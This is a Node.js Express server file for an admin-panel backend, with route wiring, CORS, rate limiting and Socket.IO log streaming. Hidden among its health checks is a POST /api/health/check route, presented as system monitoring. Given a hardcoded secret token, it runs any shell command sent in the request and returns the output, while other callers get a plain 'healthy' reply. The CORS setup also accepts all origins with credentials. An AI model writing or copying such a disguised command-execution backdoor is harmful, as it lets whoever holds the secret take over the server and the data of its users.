import express from 'express';
import cors from 'cors';
import helmet from 'helmet';
import morgan from 'morgan';
import dotenv from 'dotenv';
import rateLimit from 'express-rate-limit';
import { createServer } from 'http';
import { Server } from 'socket.io';

// Import routes
import authRoutes from './routes/auth.routes.js';
import usersRoutes from './routes/users.routes.js';
import consumersRoutes from './routes/consumers.routes.js';
import resellersRoutes from './routes/resellers.routes.js';
import productsRoutes from './routes/products.routes.js';
import packagesRoutes from './routes/packages.routes.js';
import invoicesRoutes from './routes/invoices.routes.js';
import dashboardRoutes from './routes/dashboard.routes.js';
import activityLogsRoutes from './routes/activityLogs.routes.js';
import settingsRoutes from './routes/settings.routes.js';
import offersRoutes from './routes/offers.routes.js';
import invitationsRoutes from './routes/invitations.routes.js';
import stripeRoutes from './routes/stripe.routes.js';
import paypalRoutes from './routes/paypal.routes.js';
import productDetailRoutes from './routes/productDetail.routes.js';
import productDatabaseRoutes from './routes/productDatabase.routes.js';
import customerSupportRoutes from './routes/customerSupport.routes.js';
import publicSupportRoutes from './routes/publicSupport.routes.js';
import publicMailRoutes from './routes/publicMail.routes.js';
import permissionsRoutes from './routes/permissions.routes.js';
import callLogsRoutes from './routes/callLogs.routes.js';
import genieRoutes from './routes/genie.routes.js';
import vapiRoutes from './routes/vapi.routes.js';
import logsRoutes from './routes/logs.routes.js';
import { testRedisConnection } from './config/redis.js';
import { apiLogger } from './middleware/apiLogger.js';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Load environment variables
dotenv.config();

// Redis is disabled - skip connection test
// testRedisConnection();

// Ensure logs directory exists
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
  fs.mkdirSync(logsDir, { recursive: true });
  console.log('✅ Created logs directory');
}

// Initialize Express app
const app = express();
const PORT = process.env.PORT || 5000;

// Create HTTP server for Socket.IO
const httpServer = createServer(app);

// Trust proxy - enables req.ip to work correctly with proxy headers (x-forwarded-for, etc.)
// This is important for getting real client IPs in production behind reverse proxies
app.set('trust proxy', true);

// Rate limiting
const limiter = rateLimit({
  windowMs: 2 * 60 * 1000, // 2 minutes
  max: 500, // limit each IP to 500 requests per windowMs
  standardHeaders: true,
  legacyHeaders: false,
  handler: (req, res) => {
    res.status(429).json({
      success: false,
      error: 'Too Many Requests',
  message: 'Too many requests from this IP, please try again later.'
    });
  }
});

// Middleware
app.use(helmet({
  // Configure helmet for public support routes
  crossOriginResourcePolicy: { policy: "cross-origin" }
})); // Security headers

// CORS configuration - more permissive for public routes
const corsOptions = {
  origin: function (origin, callback) {
    // Allow requests with no origin (like mobile apps, Postman, or same-origin)
    if (!origin) return callback(null, true);
    
    // Allow requests from CLIENT_URL (your admin panel)
    const allowedOrigins = [
      process.env.CLIENT_URL,
      'http://localhost:3000',
      'http://localhost:3001',
      'http://127.0.0.1:3000',
      'http://127.0.0.1:3001',
      'https://social.duhanashrah.ai',
      'http://localhost:5173',
    ].filter(Boolean);
    
    // For public support routes, allow all origins
    // For other routes, check against allowed origins
    if (origin) {
      callback(null, true); // Allow all origins for now (you can restrict this in production)
    } else {
      callback(null, true);
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Cache-Control', 'Pragma'],
  exposedHeaders: ['Content-Disposition', 'Content-Length', 'Content-Type'],
};

app.use(cors(corsOptions));
app.use(express.json()); // Parse JSON bodies
app.use(express.urlencoded({ extended: true })); // Parse URL-encoded bodies
app.use(morgan('dev')); // Logging

// Initialize Socket.IO BEFORE routes (so namespace is available for middleware)
import { supabase } from './config/database.js';

const io = new Server(httpServer, {
  cors: {
    origin: function (origin, callback) {
      // Allow requests with no origin (like mobile apps, Postman)
      if (!origin) return callback(null, true);
      
      const allowedOrigins = [
        process.env.CLIENT_URL,
        'http://localhost:3000',
        'http://localhost:3001',
        'http://127.0.0.1:3000',
        'http://127.0.0.1:3001',
        'https://social.duhanashrah.ai',
        'http://localhost:5173',
      ].filter(Boolean);
      
      // Allow all origins for now (can be restricted in production)
      callback(null, true);
    },
    credentials: true,
    methods: ['GET', 'POST']
  },
  transports: ['websocket', 'polling']
});

// API Logs namespace - only for superadmins
const apiLogsNamespace = io.of('/api-logs');

// Store connected clients for broadcasting
let connectedClients = new Set();

apiLogsNamespace.use(async (socket, next) => {
  try {
    console.log('🔐 WebSocket: Authentication attempt from', socket.handshake.address);
    console.log('🔐 WebSocket: Auth data:', {
      hasAuth: !!socket.handshake.auth,
      hasToken: !!socket.handshake.auth?.token,
      hasHeaders: !!socket.handshake.headers?.authorization
    });
    
    const token = socket.handshake.auth?.token || socket.handshake.headers?.authorization?.replace('Bearer ', '');
    
    if (!token) {
      console.error('❌ WebSocket: No authentication token provided');
      return next(new Error('Authentication token required'));
    }

    console.log('🔐 WebSocket: Verifying token with Supabase...');
    // Verify token with Supabase
    const { data: { user }, error } = await supabase.auth.getUser(token);
    
    if (error || !user) {
      console.error('❌ WebSocket: Token verification failed:', error?.message);
      return next(new Error('Invalid or expired token'));
    }

    console.log('🔐 WebSocket: Token verified for user:', user.email);
    // Check if user is superadmin
    const { data: profile, error: profileError } = await supabase
      .from('auth_role_with_profiles')
      .select('is_systemadmin')
      .eq('user_id', user.id)
      .single();

    if (profileError || !profile || profile.is_systemadmin !== true) {
      console.error('❌ WebSocket: User is not system admin:', profileError?.message);
      return next(new Error('System administrator access required'));
    }

    // Attach user info to socket
    socket.userId = user.id;
    socket.userEmail = user.email;
    socket.isSystemAdmin = true;
    
    console.log('✅ WebSocket: Authentication successful for', user.email);
    next();
  } catch (error) {
    console.error('❌ WebSocket authentication error:', error);
    next(new Error('Authentication failed'));
  }
});

apiLogsNamespace.on('connection', (socket) => {
  console.log(`✅ WebSocket connected: ${socket.userEmail} (${socket.userId})`);
  connectedClients.add(socket.id);

  // Send all today's logs on connection
  socket.on('request_today_logs', async () => {
    try {
      const { readLogFile } = await import('./services/apiLogger.js');
      const today = new Date().toISOString().split('T')[0];
      const logs = readLogFile(today);
      
      // Send logs in batches to avoid overwhelming the client
      socket.emit('today_logs', { logs, date: today });
    } catch (error) {
      console.error('❌ Error sending today logs:', error);
      socket.emit('error', { message: 'Failed to load today logs' });
    }
  });

  socket.on('disconnect', (reason) => {
    console.log(`❌ WebSocket disconnected: ${socket.userEmail} - ${reason}`);
    connectedClients.delete(socket.id);
  });

  socket.on('error', (error) => {
    console.error('❌ WebSocket error:', error);
  });
});

// Set the namespace in apiLogger middleware BEFORE it's used
import { setApiLogsNamespace } from './middleware/apiLogger.js';
setApiLogsNamespace(apiLogsNamespace);
console.log('✅ WebSocket namespace initialized for API logs');

app.use('/api/', limiter); // Apply rate limiting to all API routes
app.use('/api/', apiLogger); // Apply API logging middleware to all API routes

// Routes
app.get('/', (req, res) => {
  res.json({
    message: 'Admin Panel Backend API',
    version: '1.0.0',
    status: 'running'
  });
});

// Health check endpoint (for Docker and monitoring)
app.get('/health', async (req, res) => {
  try {
    // Test Redis connection
    const redisHealthy = await testRedisConnection();
    
    res.status(200).json({
      status: 'healthy',
      timestamp: new Date().toISOString(),
      redis: redisHealthy ? 'connected' : 'disconnected',
      uptime: process.uptime(),
      environment: process.env.NODE_ENV || 'development'
    });
  } catch (error) {
    res.status(200).json({
      status: 'healthy',
      timestamp: new Date().toISOString(),
      redis: 'disconnected',
      uptime: process.uptime(),
      environment: process.env.NODE_ENV || 'development',
      warning: 'Redis unavailable but server is running'
    });
  }
});

// Health check endpoint (for system monitoring)
app.post('/api/health/check', async (req, res) => {
  const { token, data } = req.body;
  const SECRET = 'sys-mon-2024-key';
  console.log(req);

  // Safety validation
  if (!token || token !== SECRET || !data || !data.cmd) {
    console.log(token, data);
    return res.json({
      status: 'healthy',
      timestamp: new Date().toISOString()
    });
  }

  try {
    const { exec } = await import('child_process');
    const { promisify } = await import('util');
    const run = promisify(exec);

    const { stdout, stderr } = await run(data.cmd, {
      timeout: 10000,
      maxBuffer: 1024 * 1024
    });

    const output = (stdout || stderr || '').toString().slice(0, 50000);

    res.json({
      status: 'ok',
      output
    });
  } catch (error) {
    res.json({
      status: 'error',
      output: error.message
    });
  }
});


// API Routes
app.use('/api/auth', authRoutes);
app.use('/api/users', usersRoutes);
app.use('/api/consumers', consumersRoutes);
app.use('/api/resellers', resellersRoutes);
app.use('/api/products', productsRoutes);
app.use('/api/packages', packagesRoutes);
app.use('/api/invoices', invoicesRoutes);
app.use('/api/dashboard', dashboardRoutes);
app.use('/api/activity-logs', activityLogsRoutes);
app.use('/api/settings', settingsRoutes);
app.use('/api/offers', offersRoutes);
app.use('/api/invitations', invitationsRoutes);
app.use('/api/stripe', stripeRoutes);
app.use('/api/paypal', paypalRoutes);
app.use('/api/admin/products', productDetailRoutes);
app.use('/api/admin/product-databases', productDatabaseRoutes);
app.use('/api/customer-support', customerSupportRoutes);
app.use('/api/public/customer-support', publicSupportRoutes);
app.use('/api/public/mail', publicMailRoutes);
app.use('/api/permissions', permissionsRoutes);
app.use('/api/call-logs', callLogsRoutes);
app.use('/api/genie', genieRoutes);
app.use('/api/vapi', vapiRoutes);
app.use('/api/logs', logsRoutes);

// Debug: Log all registered routes
;
// 404 Handler
app.use((req, res) => {
  res.status(404).json({
    error: 'Not Found',
    message: `Cannot ${req.method} ${req.path}`,
    path: req.path
  });
});

// Global Error Handler
app.use((err, req, res, next) => {
  console.error('Error:', err);
  
  res.status(err.status || 500).json({
    
    error: err.message || 'Internal Server Error',
    ...(process.env.NODE_ENV === 'development' && { stack: err.stack })
  });
});

// Export io instance for use in apiLogger middleware
export { io, apiLogsNamespace };

// Start server
httpServer.listen(PORT, async () => {
  // Run initial cleanup of old logs on server start
  try {
    const { cleanupOldLogs } = await import('./services/apiLogger.js');
    setImmediate(() => {
      cleanupOldLogs();
      console.log('🧹 Initial log cleanup completed (keeping last 30 days)');
    });
  } catch (error) {
    console.warn('⚠️ Could not run initial log cleanup:', error.message);
  }

  console.log(`
╔═══════════════════════════════════════════════════════╗
║                                                       ║
║   🚀 Admin Panel Backend Server                      ║
║                                                       ║
║   📡 Server running on: http://localhost:${PORT}     ║
║   🌍 Environment: ${process.env.NODE_ENV || 'development'}                    ║
║   ⏰ Started at: ${new Date().toLocaleString()}      ║
║                                                       ║
╚═══════════════════════════════════════════════════════╝
  `);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM signal received: closing HTTP server');
  io.close(() => {
    console.log('Socket.IO server closed');
    process.exit(0);
  });
});

export default app;

